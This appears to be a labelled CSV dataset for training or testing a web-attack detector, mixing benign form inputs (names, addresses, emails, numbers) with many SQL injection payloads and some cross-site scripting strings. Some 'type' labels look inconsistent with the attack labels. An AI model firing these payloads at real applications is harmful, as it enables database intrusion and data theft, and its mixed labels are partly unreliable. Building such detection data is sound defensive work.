Text,attack_type,Label,type
"-9553"") as geih where 6453=6453 or 8453=8159--",sqli,1,sql
"-5518) as yvqm where 7360=7360 union all select 7360,7360#",sqli,1,sql
45053569l,norm,0,normal
"c/ angel ochotorena, 132, 10?b",norm,0,normal
del,norm,0,normal
"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
1957012493079149,norm,0,normal
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dqis""=""dqis",sqli,1,normal
1');select (case when (5423=7706) then 5423 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
09198,norm,0,normal
mar mendivil,norm,0,normal
"-4970') union all select 4625,4625,4625,4625,4625,4625,4625,4625#",sqli,1,sql
5788,norm,0,normal
genaro,norm,0,normal
tuset mendel,norm,0,normal
05696,norm,0,normal
a6r91n4,norm,0,normal
45850,norm,0,normal
valdemoro,norm,0,normal
"-9770')) as ovhh where 7903=7903 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"1""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""ugtw""=""ugtw",sqli,1,sql
urko,norm,0,normal
3816140055742895,norm,0,normal
"doctor waksmann, 120, 7?b",norm,0,normal
1')) and (3020=3020)*6703 and (('mgfd'='mgfd,sqli,1,normal
"1'+(select 'yhcf' where 8367=8367;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1'||(select 'xyft' from dual where 8250=8250 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,1,sql
"1%' and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
5601692673189337,norm,0,normal
"1) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"montmell, el",norm,0,normal
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('luoj'='luoj",sqli,1,sql
50296685d,norm,0,normal
17255,norm,0,normal
conceptear,norm,0,normal
chicon merlo,norm,0,normal
bimini,norm,0,normal
0rbul5,norm,0,normal
"1') where 9159=9159;iif(3548=8646,1,1/0)",sqli,1,sql
28812,norm,0,normal
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1,normal
"1)) as hqwy where 4433=4433 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
1) or sleep(5),sqli,1,normal
fish@erasmusrooms.de,norm,0,normal
"1"";select count(*) from generate_series(1,5000000) and ""xcjt""=""xcjt",sqli,1,sql
laumann mancha,norm,0,normal
arrego76arse,norm,0,normal
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'fbzo' like 'fbzo,sqli,1,sql
jiinshuh,norm,0,normal
"1%""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",sqli,1,sql
97649797p,norm,0,normal
"-3130) union all select 1741,1741,1741,1741,1741,1741,1741,1741#",sqli,1,sql
97728451w,norm,0,normal
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'eqle'='eqle",sqli,1,sql
lavecchi,norm,0,normal
"c/ balmes, 66,",norm,0,normal
baladrn,norm,0,normal
"1 where 8135=8135;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
aliseda fullat,norm,0,normal
82160553e,norm,0,normal
0686860883890664,norm,0,normal
-1393'))) union all select 8280--,sqli,1,sql
"1))) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
tr871lat5cia,norm,0,normal
"-7101))) union all select 4587,4587,4587,4587,4587,4587--",sqli,1,sql
"1"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""aall"" like ""aall",sqli,1,sql
-8639) or 8138=6252,sqli,1,normal
"atazar, el",norm,0,normal
"-3472' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
-6190') where 2621=2621 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
28190,norm,0,normal
"1%')) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
domingo,norm,0,normal
13591,norm,0,normal
gula,norm,0,normal
"1 where 7412=7412 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
mangot barra,norm,0,normal
chalanera,norm,0,normal
santos,norm,0,normal
"1"") as gffq where 4387=4387 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rhli",sqli,1,sql
"1) as rsyw where 4857=4857 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
antonell ferriani,norm,0,normal
"1""));select pg_sleep(5) and ((""qani""=""qani",sqli,1,sql
cervecera,norm,0,normal
"c/ alfara de algimia, 184",norm,0,normal
7s0av07rido,norm,0,normal
6pa439ue494s,norm,0,normal
linas,norm,0,normal
"1"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1 where 4985=4985 order by 1#,sqli,1,normal
"1'+(select 'bsva' where 4378=4378 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",sqli,1,sql
1 where 9774=9774;begin dbms_lock.sleep(5); end--,sqli,1,sql
leoine,norm,0,normal
-8056)) as botl where 9225=9225 or (1182=7641)*7641--,sqli,1,sql
francina,norm,0,normal
1%';if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
valdepolo,norm,0,normal
1') as dpmh where 5281=5281 and 2006=2006,sqli,1,normal
"1%"");select case when 9390=5752 then 1 else null end--",sqli,1,sql
6684,norm,0,normal
4e03+17a9a,norm,0,normal
-9711'+(select 'ckpj' where 8338=8338 union all select 8338--,sqli,1,sql
53424203x,norm,0,normal
08466616v,norm,0,normal
guardiola puertolas,norm,0,normal
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fjwv"" like ""fjwv",sqli,1,sql
"1"");(select * from (select(sleep(5)))srmq) and (""avyw""=""avyw",sqli,1,sql
heyes@automovilesalhambra.sn,norm,0,normal
98970543w,norm,0,normal
6142057551987686,norm,0,normal
agujer4e2o,norm,0,normal
nagy4,norm,0,normal
donadieu zanotti,norm,0,normal
"1' where 7353=7353 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1) where 9078=9078 rlike sleep(5)#,sqli,1,normal
6839,norm,0,normal
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('iwwa' like 'iwwa",sqli,1,sql
6613351872741676,norm,0,normal
1218546824754723,norm,0,normal
galina,norm,0,normal
"camino de los cipreses 125,",norm,0,normal
"1%"")) and 2006=2006",sqli,1,normal
misczak,norm,0,normal
34239,norm,0,normal
98097212g,norm,0,normal
"1'||(select 'lxpg' where 7390=7390 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,1,sql
yu-hung,norm,0,normal
"calle llansa, s/n, 1a",norm,0,normal
"-3377"") or 4982=6608#",sqli,1,normal
31588,norm,0,normal
"pujada parc 111, 1-a",norm,0,normal
ireland-lamargue@arrsys.ba,norm,0,normal
logr_era,norm,0,normal
kuss@inoxled.jobs,norm,0,normal
"1%') union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
monserrat,norm,0,normal
calle corinto 108,norm,0,normal
"calle arenys de mar, 113,",norm,0,normal
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('jhlj'='jhlj,sqli,1,sql
05122,norm,0,normal
6550423388697055,norm,0,normal
sicotte@sevach.yu,norm,0,normal
1' where 2389=2389 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
"-7235"") union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",sqli,1,sql
broughton0@naturalchild.lc,norm,0,normal
"1"" where 6347=6347 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
c/ enrique marias 129,norm,0,normal
meridel,norm,0,normal
43018788w,norm,0,normal
"-9247'))) union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",sqli,1,sql
enio,norm,0,normal
6966,norm,0,normal
nanjar viejo,norm,0,normal
murton@estirpe-heroes.id,norm,0,normal
encatusar,norm,0,normal
96795973j,norm,0,normal
3755385437912895,norm,0,normal
alert(1)></title><title title=></title>,xss,2,normal
sedo kohls,norm,0,normal
opopnaco,norm,0,normal
"1))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9184=9184",sqli,1,sql
frutos,norm,0,normal
"<link rel=""stylesheet"" href=""http://vulnerability-lab.com/crosssitescripting.css"">",xss,2,normal
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""xss"")>",xss,2,sql
"-5989%"" union all select 3581,3581,3581,3581,3581--",sqli,1,sql
ve60u10,norm,0,normal
"1"")) as ktue where 6392=6392 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1'||(select 'bmyt' from dual where 9407=9407 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli,1,sql
acebes matiz,norm,0,normal
wingfiel,norm,0,normal
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""eoab"" like ""eoab",sqli,1,sql
samy,norm,0,normal
"1"")) order by 1--",sqli,1,sql
88301886x,norm,0,normal
05631,norm,0,normal
jacarandina,norm,0,normal
par4u8i67t3,norm,0,normal
"1"") where 3393=3393 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
c1236ometimi8nto,norm,0,normal
tramaced,norm,0,normal
stephan,norm,0,normal
03820,norm,0,normal
grimsley,norm,0,normal
ciro,norm,0,normal
1)) as pzoo where 8036=8036 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
620,norm,0,normal
conoto villarreal,norm,0,normal
-9405' union all select 2539--,sqli,1,sql
torrent refojo,norm,0,normal
"1)) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
recomendaci$n,norm,0,normal
ildemar,norm,0,normal
1) where 1096=1096;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
5357,norm,0,normal
18301326l,norm,0,normal
corretora,norm,0,normal
miner@zing.lk,norm,0,normal
picaronaza,norm,0,normal
rix.piljeckaja@waterflyesp.be,norm,0,normal
"1 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"1%"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"passeig desert 180,",norm,0,normal
romaguera camargo,norm,0,normal
1') where 5287=5287 and 7533=7533--,sqli,1,sql
96378295s,norm,0,normal
liester-okamoto@carloshoya.np,norm,0,normal
"-9160') union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",sqli,1,sql
76518142v,norm,0,normal
-8341 or 8571=8571--,sqli,1,sql
"-8200%"")) union all select 7538,7538,7538#",sqli,1,sql
"-9389' where 5713=5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",sqli,1,sql
artero canamasa,norm,0,normal
huebing@biosoftware.pe,norm,0,normal
"-2340%"" order by 1#",sqli,1,normal
comerate.foldi@ofertaschinas.dm,norm,0,normal
llobet garrido,norm,0,normal
-5365 or 7517=5726--,sqli,1,sql
tapasco peleij,norm,0,normal
firat6,norm,0,normal
"1""));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
"1"")) or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
de tena leguizamn,norm,0,normal
plcida,norm,0,normal
7713842274771043,norm,0,normal
44394,norm,0,normal
"1%'))) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1%"" union all select null--",sqli,1,sql
"calle andorra, 191, 8-g",norm,0,normal
"1"") where 9295=9295 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
seliem,norm,0,normal
resaca,norm,0,normal
"-6770')) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",sqli,1,sql
bucardo,norm,0,normal
-4954') or 8571=8571--,sqli,1,sql
"1"" where 4161=4161 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"calle radio, 89 10f",norm,0,normal
"1"")) as dfwi where 9703=9703 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
5264009665543297,norm,0,normal
"-1<img src=""javascript:document.cookie=true;"">",xss,2,xss
querbico,norm,0,normal
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
-6341' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'ugys'='ugys,sqli,1,sql
"1%')) union all select null,null,null,null,null,null#",sqli,1,sql
41,norm,0,normal
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
"1'+(select 'ycsv' where 3628=3628 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
camila5,norm,0,normal
i-chao,norm,0,normal
rodolfo,norm,0,normal
otxandio,norm,0,normal
"1') as xvcr where 6456=6456 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
c4l6716o,norm,0,normal
georgian,norm,0,normal
"nardo, 12, 13e",norm,0,normal
impenetr-abilidad,norm,0,normal
"1"") or (select * from (select(sleep(5)))ydpu) and (""gixv""=""gixv",sqli,1,sql
18708,norm,0,normal
fitz,norm,0,normal
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
grevelin,norm,0,normal
sunderla,norm,0,normal
genoveva,norm,0,normal
ziemba,norm,0,normal
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('iuki'='iuki,sqli,1,sql
ver7ac1,norm,0,normal
1') and 7533=7533 and ('dbjq'='dbjq,sqli,1,normal
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('xfmq'='xfmq",sqli,1,sql
p5lm9269,norm,0,normal
1);select sleep(5) and (4863=4863,sqli,1,sql
"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",sqli,1,sql
"c/ pedro lagasca, 176,",norm,0,normal
1%';(select * from (select(sleep(5)))srmq) and '%'=',sqli,1,sql
"1'+(select 'ndpx' where 4061=4061 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
-4339) where 7178=7178 or 4008=7232,sqli,1,normal
"carrer jaume d'artes 78,",norm,0,normal
1') and 8404=8651#,sqli,1,normal
barnett@micaelagriga.mw,norm,0,normal
lurlene,norm,0,normal
4626,norm,0,normal
"-4032"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""olox""=""olox",sqli,1,sql
serret@sierradealcaraz.dj,norm,0,normal
"1'||(select 'hfbt' where 7204=7204 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
parola@zonamodelos.pl,norm,0,normal
tarasewi,norm,0,normal
"-1<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",xss,2,sql
racache@velaconsultores.mil,norm,0,normal
taspatch,norm,0,normal
melbourn,norm,0,normal
3151,norm,0,normal
"1%"" union all select null,null,null#",sqli,1,sql
-3458') where 2053=2053 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
8965,norm,0,normal
8233,norm,0,normal
innova5miento,norm,0,normal
54408548r,norm,0,normal
boutigny@maxtienda.mx,norm,0,normal
-3304')) order by 1--,sqli,1,sql
1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--,sqli,1,sql
6572,norm,0,normal
"1"") as lgxc where 1117=1117 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
corey,norm,0,normal
"1"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""vhey""=""vhey",sqli,1,sql
-7633') as aslj where 2317=2317 or 8571=8571--,sqli,1,sql
manquel,norm,0,normal
1' where 9816=9816 and 7533=7533--,sqli,1,sql
maclaren,norm,0,normal
79564193v,norm,0,normal
"c/ san lorenzo, 171",norm,0,normal
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""xhvo""=""xhvo",sqli,1,sql
granach@mccomptables.be,norm,0,normal
olivieri_needham@escuelamontessori.us,norm,0,normal
"1') or elt(6272=6272,sleep(5))",sqli,1,normal
indiligencia,norm,0,normal
"1"") and 9198=9198--",sqli,1,sql
"ronda o'donnell, 106, 12?e",norm,0,normal
"1"")) as dshc where 9911=9911 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
sheffield@ringringrent.my,norm,0,normal
wieth@camiones-hibridos.md,norm,0,normal
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('swjk'='swjk",sqli,1,normal
19782471x,norm,0,normal
0orru6t5,norm,0,normal
maragliano serna,norm,0,normal
"1"";select sleep(5) and ""jvys"" like ""jvys",sqli,1,sql
teodota,norm,0,normal
"1"") where 7513=7513 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
98820419e,norm,0,normal
50790,norm,0,normal
exagerante,norm,0,normal
las palmas,norm,0,normal
35,norm,0,normal
manrique,norm,0,normal
"(select concat(0x7171706a71,(select (elt(7381=7381,1))),0x717a767a71))",sqli,1,sql
mitune@necesitouncredito.sl,norm,0,normal
armelle,norm,0,normal
"-8940"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""vnuo"" like ""vnuo",sqli,1,sql
2672,norm,0,normal
"1"")) as rpxd where 4929=4929;waitfor delay '0:0:5'--",sqli,1,sql
"1') and make_set(8403=8403,8899) and ('kyxl'='kyxl",sqli,1,normal
5418155062739294,norm,0,normal
4872,norm,0,normal
1');select sleep(5) and ('qcsv'='qcsv,sqli,1,sql
"1)) as queb where 2449=2449 union all select null,null#",sqli,1,sql
"1'||(select 'xuou' from dual where 7681=7681 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'",sqli,1,sql
"-8124) union all select 7251,7251,7251#",sqli,1,sql
"plaza aparejador federico bermudez 139,",norm,0,normal
fierro@porqueagel.je,norm,0,normal
4743,norm,0,normal
1 rlike (select (case when (8911=5301) then 1 else 0x28 end))# pmuh,sqli,1,sql
hatzenbi5,norm,0,normal
els,norm,0,normal
talens zumalacrregui,norm,0,normal
bielat,norm,0,normal
"1%""))) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
"motril, 131",norm,0,normal
55119519l,norm,0,normal
"pl. finlandia, 58, 7?d",norm,0,normal
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('gsdq'='gsdq",sqli,1,sql
"-5548' where 4477=4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",sqli,1,sql
guinaldo guals,norm,0,normal
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('tpih'='tpih",sqli,1,sql
"dels segons jocs mediterranis 86, 3-h",norm,0,normal
"1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)# vojr",sqli,1,sql
marjan@bahiadelasirenas.cu,norm,0,normal
tesch,norm,0,normal
3765,norm,0,normal
1%'))) and 6969=(select 6969 from pg_sleep(5)) and ((('%'=',sqli,1,sql
mukherje,norm,0,normal
deli6escenci1,norm,0,normal
28011073v,norm,0,normal
buscarin,norm,0,normal
cabrejas del pinar,norm,0,normal
calomee.mirren1@nuestrasantacruz.bj,norm,0,normal
"1 or 8421=(select count(*) from generate_series(1,5000000))# jmki",sqli,1,sql
(select (case when (7018=7018) then 7018 else 7018*(select 7018 from master..sysdatabases) end)),sqli,1,sql
"1%""))) union all select null#",sqli,1,sql
cash4@hotelestopsecret.cr,norm,0,normal
"-1631%"") or elt(8285=1709,1709) and (""%""=""",sqli,1,normal
muelle de astillero 128 5-b,norm,0,normal
"carrer violas, 60,",norm,0,normal
conocc,norm,0,normal
lecuona gasull,norm,0,normal
">""<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",xss,2,xss
vicente,norm,0,normal
"1%')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('%'='",sqli,1,sql
3302117123489448,norm,0,normal
0208625948650928,norm,0,normal
sagaceta farell,norm,0,normal
"elt(2427=2427,5518)",sqli,1,normal
"c/ arago 194,",norm,0,normal
24893,norm,0,normal
robledillo de la jara,norm,0,normal
punsly-giskes@botilleria.com.ni,norm,0,normal
"calle casarrubuelos, 125, 10?b",norm,0,normal
masini,norm,0,normal
1 where 7464=7464 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1,sql
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",sqli,1,sql
guinea hinojar,norm,0,normal
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('bvdw'='bvdw",sqli,1,sql
folch pintado,norm,0,normal
1'||(select 'yyil' from dual where 3121=3121;if(2695=9045) select 2695 else drop function qmno--,sqli,1,sql
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('fbsi' like 'fbsi",sqli,1,sql
">""<img src=""blah>"" onmouseover=""document.cookie=true;"">",xss,2,sql
"1%"") rlike sleep(5) and (""%""=""",sqli,1,normal
eslava,norm,0,normal
clech@ofertachina.lb,norm,0,normal
e57ol40,norm,0,normal
"calle huesca, 136,",norm,0,normal
felleghy@zafranet.md,norm,0,normal
op0o62i4,norm,0,normal
1)) and (4169=9887)*9887 and ((1137=1137,sqli,1,normal
pravia,norm,0,normal
henry@sms24h.tr,norm,0,normal
3581922362739971,norm,0,normal
verney,norm,0,normal
"-6600') union all select 5566,5566#",sqli,1,sql
alcoy/alcoi,norm,0,normal
dentellar,norm,0,normal
qui0g6n16si2o,norm,0,normal
"-4350"")) as mmwq where 9801=9801 or (8520=2834)*2834--",sqli,1,sql
bancroft@lawn.mc,norm,0,normal
san emiliano,norm,0,normal
-7505')) as lqvw where 8565=8565 or 6872=6872--,sqli,1,sql
garabero,norm,0,normal
"-2059%"" or elt(4587=3101,3101) and ""%""=""",sqli,1,normal
aluda,norm,0,normal
822rrac106,norm,0,normal
renick@piaceredelivery.hn,norm,0,normal
"-6357"") union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",sqli,1,sql
"-9574') as rxym where 4719=4719 union all select 4719,4719,4719,4719,4719,4719,4719--",sqli,1,sql
"1"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1'+(select 'arqt' where 2336=2336 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and '%'='",sqli,1,sql
2639,norm,0,normal
-7021' or 3038=3038,sqli,1,normal
"1' in boolean mode) or 8466=benchmark(5000000,md5(0x694a4745))#",sqli,1,normal
"1"")) as azak where 4911=4911;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""nzgn""=""nzgn",sqli,1,sql
leth8,norm,0,normal
d2s7sp79ro,norm,0,normal
berba.andreguy4@campanasextractoras.sh,norm,0,normal
"1',(select (case when (7711=7711) then 1 else 7711*(select 7711 from information_schema.character_sets) end))",sqli,1,sql
